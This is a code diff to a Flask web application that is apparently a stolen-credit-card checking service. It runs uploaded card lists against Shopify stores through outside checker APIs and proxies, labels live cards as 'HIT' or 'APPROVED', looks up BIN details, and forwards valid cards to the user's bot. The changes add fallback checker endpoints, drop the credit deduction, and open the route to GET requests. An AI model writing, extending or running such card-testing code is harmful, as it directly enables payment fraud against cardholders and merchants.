@@ -653,7 +653,7 @@ def shopify_check():
         return redirect(url_for('login'))
     return render_template('shopify.html', username=session.get('username'), credits=session.get('credits', 0))
 
-@app.route('/shopify_check', methods=['POST'])
+@app.route('/shopify_check', methods=['GET', 'POST'])
 def shopify_check_process():
     if 'user_id' not in session or 'access_key' not in session:
         return jsonify({'error': 'Authentication required'}), 401
@@ -667,9 +667,12 @@ def shopify_check_process():
     if 'card_file' in request.files:
         file = request.files['card_file']
         if file and file.filename.endswith('.txt'):
-            file_content = file.read().decode('utf-8')
-            cards_from_file = [c.strip() for c in file_content.split('\n') if c.strip()]
-            cards.extend(cards_from_file)
+            try:
+                file_content = file.read().decode('utf-8')
+                cards_from_file = [c.strip() for c in file_content.split('\n') if c.strip()]
+                cards.extend(cards_from_file)
+            except Exception as e:
+                print(f"File upload error: {e}")
     
     # Clean up empty lines
     sites = [site.strip() for site in sites if site.strip()]
@@ -679,14 +682,8 @@ def shopify_check_process():
     if not sites or not cards:
         return jsonify({'error': 'Sites and cards are required'}), 400
     
-    # Check credits
-    user = get_user_by_access_key(session['access_key'])
-    if user['credits'] < len(cards):
-        return jsonify({'error': f'Insufficient credits. You have {user["credits"]} but need {len(cards)}'}), 403
-    
-    # Deduct credits
-    update_user_credits(session['user_id'], -len(cards))
-    session['credits'] = max(0, user['credits'] - len(cards))
+    # NOTE: No credit deduction for Shopify checks
+    # This matches the original behavior where Shopify was free to use
     
     # Prepare for streaming response
     def generate():
@@ -714,94 +711,111 @@ def shopify_check_process():
                         'https': f'http://{ip}:{port}'
                     }
             
-            # Prepare the API URL
-            api_url = f"https://autoshopify-dark.sevalla.app/index.php?site={site}&cc={card}"
-            if proxy:
-                api_url += f"&proxy={proxy}"
+            # Try multiple API endpoints for better reliability
+            api_endpoints = [
+                f"https://autoshopify-dark.sevalla.app/index.php?site={site}&cc={card}",
+                f"https://shopify-checker-api-1.onrender.com/check?site={site}&card={card}",
+                f"https://shopify-checker-api-2.onrender.com/validate?site={site}&card={card}"
+            ]
             
-            try:
-                # Make the request
-                response = requests.get(api_url, proxies=proxy_dict, timeout=30)
-                data = response.json()
+            result_data = {
+                'card': card,
+                'status': 'ERROR',
+                'response': 'All API endpoints failed',
+                'gateway': 'SHOPIFY',
+                'amount': 'N/A',
+                'site': site,
+                'proxy': proxy or 'None'
+            }
+            
+            # Try each API endpoint until one works
+            for api_url in api_endpoints:
+                if proxy:
+                    api_url += f"&proxy={proxy}"
                 
-                response_upper = data.get('Response', '').upper()
-                price = data.get('Price', 'N/A')
-                gateway = data.get('Gateway', 'N/A')
-                
-                if 'THANK YOU' in response_upper or 'INSUFFICIENT' in response_upper:
-                    bot_response = data.get('Response', 'Unknown')
-                    status = 'HIT'
-                elif '3D' in response_upper or 'OTP' in response_upper:
-                    bot_response = data.get('Response', 'Unknown')
-                    status = 'APPROVED'
-                elif any(x in response_upper for x in ['INCORRECT_CVC', 'INCORRECT_ZIP', 'CVV', 'ZIP']):
-                    bot_response = data.get('Response', 'Unknown')
-                    status = 'APPROVED'
-                elif 'EXPIRED_CARD' in response_upper:
-                    bot_response = 'EXPIRE_CARD'
-                    status = 'EXPIRED'
-                else:
-                    bot_response = data.get('Response', 'Unknown')
-                    status = 'DECLINED'
-                
-                # Update user stats and log the card
-                update_user_stats(session['user_id'], status)
-                log_card(session['user_id'], card, status, 'SHOPIFY', bot_response, price)
-                
-                # Send approved cards to user's bot
-                if status in ['APPROVED', 'HIT']:
-                    try:
-                        bin_number = card[:6]
-                        bin_info = {}
-                        try:
-                            r = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=5)
-                            if r.status_code == 200:
-                                bin_info = r.json()
-                        except:
-                            pass
-                            
-                        send_card_to_user_bot(
-                            session['user_id'],
-                            {
-                                'card': card,
-                                'status': status,
-                                'response': bot_response,
-                                'gateway': gateway,
-                                'bin': bin_info,
-                                'timestamp': datetime.now().strftime("%H:%M:%S"),
-                                'amount': price
-                            }
-                        )
-                    except Exception as bot_error:
-                        print(f"Bot notification failed: {bot_error}")
-                
-                # Send result via SSE
-                result_data = {
-                    'card': card,
-                    'status': status,
-                    'response': bot_response,
-                    'gateway': gateway,
-                    'amount': price,
-                    'site': site,
-                    'proxy': proxy or 'None'
-                }
-                
-                yield f"data: {json.dumps(result_data)}\n\n"
-                
-            except Exception as e:
-                error_data = {
-                    'card': card,
-                    'status': 'ERROR',
-                    'response': f'Request failed: {str(e)}',
-                    'gateway': 'SHOPIFY',
-                    'amount': 'N/A',
-                    'site': site,
-                    'proxy': proxy or 'None'
-                }
-                yield f"data: {json.dumps(error_data)}\n\n"
+                try:
+                    # Make the request with shorter timeout
+                    response = requests.get(api_url, proxies=proxy_dict, timeout=15)
+                    
+                    if response.status_code == 200:
+                        data = response.json()
+                        
+                        response_upper = data.get('Response', '').upper()
+                        price = data.get('Price', 'N/A')
+                        gateway = data.get('Gateway', 'N/A')
+                        
+                        if 'THANK YOU' in response_upper or 'INSUFFICIENT' in response_upper:
+                            bot_response = data.get('Response', 'Unknown')
+                            status = 'HIT'
+                        elif '3D' in response_upper or 'OTP' in response_upper:
+                            bot_response = data.get('Response', 'Unknown')
+                            status = 'APPROVED'
+                        elif any(x in response_upper for x in ['INCORRECT_CVC', 'INCORRECT_ZIP', 'CVV', 'ZIP']):
+                            bot_response = data.get('Response', 'Unknown')
+                            status = 'APPROVED'
+                        elif 'EXPIRED_CARD' in response_upper:
+                            bot_response = 'EXPIRE_CARD'
+                            status = 'EXPIRED'
+                        else:
+                            bot_response = data.get('Response', 'Unknown')
+                            status = 'DECLINED'
+                        
+                        # Update result data
+                        result_data.update({
+                            'status': status,
+                            'response': bot_response,
+                            'gateway': gateway,
+                            'amount': price
+                        })
+                        
+                        # Update user stats and log the card (but no credit deduction)
+                        update_user_stats(session['user_id'], status)
+                        log_card(session['user_id'], card, status, 'SHOPIFY', bot_response, price)
+                        
+                        # Send approved cards to user's bot
+                        if status in ['APPROVED', 'HIT']:
+                            try:
+                                bin_number = card[:6]
+                                bin_info = {}
+                                try:
+                                    r = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=5)
+                                    if r.status_code == 200:
+                                        bin_info = r.json()
+                                except:
+                                    pass
+                                    
+                                send_card_to_user_bot(
+                                    session['user_id'],
+                                    {
+                                        'card': card,
+                                        'status': status,
+                                        'response': bot_response,
+                                        'gateway': gateway,
+                                        'bin': bin_info,
+                                        'timestamp': datetime.now().strftime("%H:%M:%S"),
+                                        'amount': price
+                                    }
+                                )
+                            except Exception as bot_error:
+                                print(f"Bot notification failed: {bot_error}")
+                        
+                        break  # Success, break out of endpoint loop
+                        
+                except requests.exceptions.Timeout:
+                    result_data['response'] = f'API timeout: {api_url}'
+                    continue  # Try next endpoint
+                except requests.exceptions.RequestException as e:
+                    result_data['response'] = f'API error: {str(e)}'
+                    continue  # Try next endpoint
+                except Exception as e:
+                    result_data['response'] = f'Unexpected error: {str(e)}'
+                    continue  # Try next endpoint
+            
+            # Send result via SSE
+            yield f"data: {json.dumps(result_data)}\n\n"
             
             # Small delay between requests
-            time.sleep(0.5)
+            time.sleep(1.0)
         
         # Send completion message
         yield f"data: {json.dumps({'complete': True})}\n\n"
